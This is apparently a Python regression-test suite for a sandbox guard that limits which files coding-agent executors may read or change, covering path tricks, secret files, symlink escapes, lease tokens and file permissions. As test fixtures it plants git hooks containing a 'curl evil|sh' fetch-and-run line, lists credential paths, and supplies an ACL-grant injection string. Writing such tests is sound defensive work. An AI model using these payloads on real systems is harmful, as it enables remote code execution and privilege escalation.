"""Regression tests for the hostile security audit of forgeboss/security.

Every test here corresponds to a defect that was confirmed exploitable against the
pre-audit guard. Run with: python -m unittest forgeboss.security.test_executor_guard_hostile
"""
from __future__ import annotations
import json,os,stat,sys,tempfile,time,unittest
from pathlib import Path

ROOT=Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:sys.path.insert(0,str(ROOT))

from forgeboss.security.executor_guard import (
    SecurityError,norm,sensitive,secret_path,validate_packet,snapshot,changed,
    canonical_executor,isolation_ok,assert_paths_contained,assert_no_link_escape,
    postflight,issue,verify,
)
from forgeboss.security.local_acl import LocalAclError,harden_private_path,harden_private_dir

POSIX=os.name!="nt"


class NormalizationTests(unittest.TestCase):
    def test_existing_contract_preserved(self):
        self.assertEqual(norm(".git/hooks/pre-commit"),".git/hooks/pre-commit")
        self.assertEqual(norm("src\\app.py"),"src/app.py")
        self.assertEqual(norm("./src/app.py"),"src/app.py")

    def test_absolute_and_traversal_still_denied(self):
        for bad in ["/etc/passwd","C:/Windows/system32","~/.ssh/id_rsa","a/../../b","",
                    "//server/share/x","\\\\?\\C:\\x"]:
            with self.assertRaises(SecurityError,msg=bad):norm(bad)

    def test_trailing_dot_and_space_denied(self):
        # Windows strips trailing dots/spaces, so "pyproject.toml." names pyproject.toml.
        for bad in ["pyproject.toml.",".env.",".git.","package.json.","src/app.py.","a. /b"]:
            with self.assertRaises(SecurityError,msg=bad):norm(bad)

    def test_alternate_data_stream_denied(self):
        for bad in ["file.txt:ads",".env:hidden","package.json::$DATA","a/b.py:x"]:
            with self.assertRaises(SecurityError,msg=bad):norm(bad)

    def test_reserved_device_names_denied(self):
        for bad in ["NUL","con","aux.py","COM1","lpt9.txt","src/nul","CONIN$"]:
            with self.assertRaises(SecurityError,msg=bad):norm(bad)

    def test_control_characters_denied(self):
        for bad in ["a\x00b","a\nb","src/\x1fx"]:
            with self.assertRaises(SecurityError,msg=repr(bad)):norm(bad)

    def test_windows_illegal_wildcards_denied(self):
        for bad in ["*.py","src/?.py",'a"b',"a|b","a<b"]:
            with self.assertRaises(SecurityError,msg=bad):norm(bad)


class SensitiveScopeTests(unittest.TestCase):
    def test_documented_root_denials_still_hold(self):
        for p in [".git/hooks/pre-commit",".ENV","package.json",
                  "state/forgebossd/forgeboss.db","state/learning/forgeboss-learning.db",
                  ".github/workflows/ci.yml","secrets/key"]:
            self.assertTrue(sensitive(p),p)

    def test_nested_ci_and_git_surfaces_denied(self):
        # These are equally executable at depth; the root-anchored prefix list missed them.
        for p in ["sub/.git/hooks/pre-commit","pkg/.github/workflows/evil.yml",
                  "vendor/.github/actions/a/action.yml","a/b/.circleci/config.yml",
                  "web/node_modules/.bin/x","tools/.vscode/tasks.json"]:
            self.assertTrue(sensitive(p),p)

    def test_nested_supply_chain_manifests_denied(self):
        for p in ["packages/app/package.json","svc/Dockerfile","svc/requirements.txt",
                  "a/b/pyproject.toml","x/Makefile"]:
            self.assertTrue(sensitive(p),p)

    def test_nested_secrets_denied(self):
        for p in ["vendor/.env","cfg/.env.production","a/id_rsa","certs/server.pem",
                  "deploy/.npmrc","home/.aws/credentials","x/.ssh/known_hosts"]:
            self.assertTrue(sensitive(p),p)
            self.assertTrue(secret_path(p),p)

    def test_ordinary_source_still_allowed(self):
        for p in ["src/app.py","README.md","docs/guide.md","tests/test_app.py",
                  "src/components/Button.tsx"]:
            self.assertFalse(sensitive(p),p)


class PacketScopeTests(unittest.TestCase):
    def test_context_files_cannot_exfiltrate_secrets(self):
        # Context files are pasted into a model prompt: read scope is exfiltration scope.
        for leak in [".env","secrets/key.pem",".npmrc","cfg/.env.local","a/id_ed25519"]:
            with self.assertRaises(SecurityError,msg=leak):
                validate_packet({"allowed_files":["src/a.py"],"context_files":[leak]})

    def test_context_git_metadata_denied_at_depth(self):
        with self.assertRaises(SecurityError):
            validate_packet({"allowed_files":["src/a.py"],"context_files":["sub/.git/config"]})

    def test_benign_context_still_allowed(self):
        allowed,context=validate_packet({"allowed_files":["src/a.py"],
                                         "context_files":["README.md","src/b.py"]})
        self.assertEqual(allowed,["src/a.py"])
        self.assertEqual(context,["README.md","src/b.py"])

    def test_empty_and_duplicate_scope_denied(self):
        with self.assertRaises(SecurityError):validate_packet({"allowed_files":[]})
        with self.assertRaises(SecurityError):
            validate_packet({"allowed_files":["src/A.py","src/a.py"],"context_files":[]})

    def test_trailing_dot_write_scope_denied(self):
        # Pre-audit this reached the filesystem as pyproject.toml with policy saying "ok".
        with self.assertRaises(SecurityError):
            validate_packet({"allowed_files":["pyproject.toml."],"context_files":[]})


class ExecutorIdentityTests(unittest.TestCase):
    def test_case_and_whitespace_cannot_dodge_quarantine(self):
        for variant in ["OpenHands","openhands "," OPENCODE","open_code" ]:
            try:c=canonical_executor(variant)
            except SecurityError:continue
            self.assertIn(c,("openhands","opencode"),variant)

    def test_unknown_executor_denied(self):
        for bad in ["totally-unknown","","  ",None,123]:
            with self.assertRaises(SecurityError,msg=repr(bad)):canonical_executor(bad)

    def test_unproven_executors_are_quarantined(self):
        prev=os.environ.pop("FORGEBOSS_OS_ISOLATION_VERIFIED",None)
        try:
            self.assertTrue(isolation_ok("mini-swe"))
            self.assertFalse(isolation_ok("OpenHands"))
            self.assertFalse(isolation_ok("deepagents"))
        finally:
            if prev is not None:os.environ["FORGEBOSS_OS_ISOLATION_VERIFIED"]=prev


class SnapshotIntegrityTests(unittest.TestCase):
    def setUp(self):
        self.td=tempfile.TemporaryDirectory();self.addCleanup(self.td.cleanup)
        self.work=Path(self.td.name)/"work";self.work.mkdir()

    def test_git_execution_surfaces_are_tracked(self):
        # Volatile git internals stay excluded, but hooks/config are code execution.
        (self.work/"a.txt").write_text("a")
        hooks=self.work/".git"/"hooks";hooks.mkdir(parents=True)
        (self.work/".git"/"objects").mkdir()
        (self.work/".git"/"objects"/"deadbeef").write_text("blob")
        before=snapshot(self.work)
        (hooks/"pre-commit").write_text("#!/bin/sh\ncurl evil|sh\n")
        (self.work/".git"/"config").write_text("[core]\n")
        (self.work/".git"/"objects"/"cafe").write_text("blob2")
        ch=changed(before,snapshot(self.work))
        self.assertIn(".git/hooks/pre-commit",ch)
        self.assertIn(".git/config",ch)
        self.assertNotIn(".git/objects/cafe",ch)

    def test_unnameable_paths_are_not_dropped(self):
        # Pre-audit any path norm() refused was silently absent from both snapshots,
        # making it a permanent blind spot for the postflight scope check.
        before=snapshot(self.work)
        (self.work/"~").mkdir();(self.work/"~"/"payload.py").write_text("import os")
        ch=changed(before,snapshot(self.work))
        self.assertTrue(any("payload.py" in k for k in ch),ch)

    @unittest.skipUnless(POSIX,"POSIX mode bits")
    def test_execute_bit_flip_is_detected(self):
        f=self.work/"tool.sh";f.write_text("echo hi");os.chmod(f,0o644)
        before=snapshot(self.work)
        os.chmod(f,0o755)
        self.assertIn("tool.sh",changed(before,snapshot(self.work)))


class ContainmentTests(unittest.TestCase):
    def setUp(self):
        self.td=tempfile.TemporaryDirectory();self.addCleanup(self.td.cleanup)
        self.root=Path(self.td.name).resolve()
        self.work=self.root/"work";self.work.mkdir()
        self.outside=self.root/"outside";self.outside.mkdir()
        (self.outside/"loot.txt").write_text("secret")

    @unittest.skipUnless(POSIX,"symlink creation")
    def test_symlinked_directory_ancestor_is_rejected(self):
        os.symlink(self.outside,self.work/"linkdir")
        with self.assertRaises(SecurityError):
            assert_paths_contained(self.work,["linkdir/new.txt"])

    @unittest.skipUnless(POSIX,"symlink creation")
    def test_dangling_symlink_target_outside_is_rejected(self):
        os.symlink(self.outside/"missing.txt",self.work/"dangling.txt")
        with self.assertRaises(SecurityError):
            assert_paths_contained(self.work,["dangling.txt"])

    @unittest.skipUnless(POSIX,"symlink creation")
    def test_baseline_link_scan_rejects_any_link(self):
        os.symlink(self.outside/"loot.txt",self.work/"loot.txt")
        with self.assertRaises(SecurityError):assert_no_link_escape(self.work)

    def test_contained_paths_accepted(self):
        (self.work/"src").mkdir()
        assert_paths_contained(self.work,["src/app.py","README.md"])


class LeaseLifecycleTests(unittest.TestCase):
    """End-to-end issue -> postflight against a real workspace."""
    def setUp(self):
        self.td=tempfile.TemporaryDirectory();self.addCleanup(self.td.cleanup)
        self.work=Path(self.td.name)/"work";self.work.mkdir()
        (self.work/"src").mkdir();(self.work/"src"/"app.py").write_text("x=1\n")
        self.packet=Path(self.td.name)/"packet.json"
        self.packet.write_text(json.dumps({"allowed_files":["src/app.py"],
                                           "context_files":["src/app.py"]}),encoding="utf-8")

    def _issue(self):
        import io,contextlib
        buf=io.StringIO()
        with contextlib.redirect_stdout(buf):
            issue(str(self.packet),str(self.work),"mini-swe",ttl=600)
        return json.loads(buf.getvalue())

    def test_in_scope_change_passes_and_out_of_scope_fails(self):
        import io,contextlib
        r=self._issue()
        (self.work/"src"/"app.py").write_text("x=2\n")
        buf=io.StringIO()
        with contextlib.redirect_stdout(buf):
            postflight(r["lease"],r["token"],str(self.packet),str(self.work),"mini-swe")
        self.assertTrue(json.loads(buf.getvalue())["ok"])

        r2=self._issue()
        (self.work/"src"/"sneaky.py").write_text("import os\n")
        with self.assertRaises(SecurityError):
            postflight(r2["lease"],r2["token"],str(self.packet),str(self.work),"mini-swe")

    def test_git_hook_plant_is_caught_by_postflight(self):
        import shutil,subprocess
        git=shutil.which("git")
        if not git:self.skipTest("git not available")
        subprocess.run([git,"init","-q",str(self.work)],check=True,capture_output=True)
        r=self._issue()
        (self.work/".git"/"hooks"/"post-checkout").write_text("#!/bin/sh\ncurl evil|sh\n")
        with self.assertRaises(SecurityError) as cm:
            postflight(r["lease"],r["token"],str(self.packet),str(self.work),"mini-swe")
        self.assertIn(".git/hooks/post-checkout",str(cm.exception))

    def test_lease_ttl_and_schema_are_pinned(self):
        r=self._issue();lp=Path(r["lease"]);lease=json.loads(lp.read_text())
        for mutate in [{"schema":1},{"expires_at":lease["issued_at"]+10**9},
                       {"issued_at":time.time()+10**6,"expires_at":time.time()+10**6+600},
                       {"baseline":"not-a-dict"}]:
            bad=dict(lease);bad.update(mutate)
            lp.write_text(json.dumps(bad),encoding="utf-8")
            with self.assertRaises(SecurityError,msg=str(mutate)):
                verify(str(lp),r["token"],str(self.packet),str(self.work),"mini-swe")

    def test_scope_widened_after_issue_is_rejected(self):
        r=self._issue()
        self.packet.write_text(json.dumps({"allowed_files":["src/app.py","src/other.py"],
                                           "context_files":[]}),encoding="utf-8")
        with self.assertRaises(SecurityError):
            verify(r["lease"],r["token"],str(self.packet),str(self.work),"mini-swe")

    def test_wrong_token_rejected(self):
        r=self._issue()
        with self.assertRaises(SecurityError):
            verify(r["lease"],"not-the-token",str(self.packet),str(self.work),"mini-swe")

    def test_lease_file_is_owner_only(self):
        r=self._issue()
        if POSIX:
            self.assertEqual(stat.S_IMODE(Path(r["lease"]).stat().st_mode)&0o077,0)

    def test_quarantined_executor_cannot_get_a_lease(self):
        prev=os.environ.pop("FORGEBOSS_OS_ISOLATION_VERIFIED",None)
        try:
            for ex in ["openhands","OpenHands","opencode","deepagents"]:
                with self.assertRaises(SecurityError,msg=ex):
                    issue(str(self.packet),str(self.work),ex,ttl=600)
        finally:
            if prev is not None:os.environ["FORGEBOSS_OS_ISOLATION_VERIFIED"]=prev


class LocalAclTests(unittest.TestCase):
    def setUp(self):
        self.td=tempfile.TemporaryDirectory();self.addCleanup(self.td.cleanup)
        self.root=Path(self.td.name)

    @unittest.skipUnless(POSIX,"symlink creation")
    def test_harden_refuses_to_follow_a_symlink(self):
        victim=self.root/"victim.txt";victim.write_text("secret");os.chmod(victim,0o644)
        link=self.root/"link.json";os.symlink(victim,link)
        with self.assertRaises(LocalAclError):harden_private_path(link)
        self.assertEqual(stat.S_IMODE(victim.stat().st_mode),0o644)

    @unittest.skipUnless(POSIX,"symlink creation")
    def test_harden_dir_refuses_a_symlinked_directory(self):
        target=self.root/"target";target.mkdir();os.chmod(target,0o755)
        link=self.root/"link";os.symlink(target,link)
        with self.assertRaises(LocalAclError):harden_private_dir(link)
        self.assertEqual(stat.S_IMODE(target.stat().st_mode),0o755)

    @unittest.skipUnless(POSIX,"POSIX mode bits")
    def test_parent_directories_are_created_private(self):
        d=self.root/"a"/"b"/"c";harden_private_dir(d)
        for p in [self.root/"a",self.root/"a"/"b",d]:
            self.assertEqual(stat.S_IMODE(p.stat().st_mode)&0o077,0,str(p))

    @unittest.skipUnless(POSIX,"POSIX mode bits")
    def test_file_is_owner_only(self):
        f=self.root/"s.bin";f.write_text("x");os.chmod(f,0o666)
        harden_private_path(f)
        self.assertEqual(stat.S_IMODE(f.stat().st_mode),0o600)

    def test_broad_principal_is_refused(self):
        from forgeboss.security import local_acl
        for name in ["Everyone","everyone","authenticated users","DOM\\Everyone","Jeder"]:
            with self.subTest(name=name):
                prev={k:os.environ.get(k) for k in ("LOGNAME","USER","USERNAME","LNAME")}
                for k in prev:os.environ[k]=name
                try:
                    with self.assertRaises(LocalAclError):local_acl._user()
                finally:
                    for k,v in prev.items():
                        if v is None:os.environ.pop(k,None)
                        else:os.environ[k]=v

    def test_malformed_principal_is_refused(self):
        from forgeboss.security import local_acl
        # Surrounding whitespace is stripped, not rejected; the metacharacters that
        # would restructure an icacls grant string are what must be refused.
        for name in ["me:(F) /grant Everyone","a\"b","x*","bad/name","a,b","(x)"]:
            with self.subTest(name=name):
                prev={k:os.environ.get(k) for k in ("LOGNAME","USER","USERNAME","LNAME")}
                for k in prev:os.environ[k]=name
                try:
                    with self.assertRaises(LocalAclError):local_acl._user()
                finally:
                    for k,v in prev.items():
                        if v is None:os.environ.pop(k,None)
                        else:os.environ[k]=v


if __name__=="__main__":unittest.main(verbosity=2)
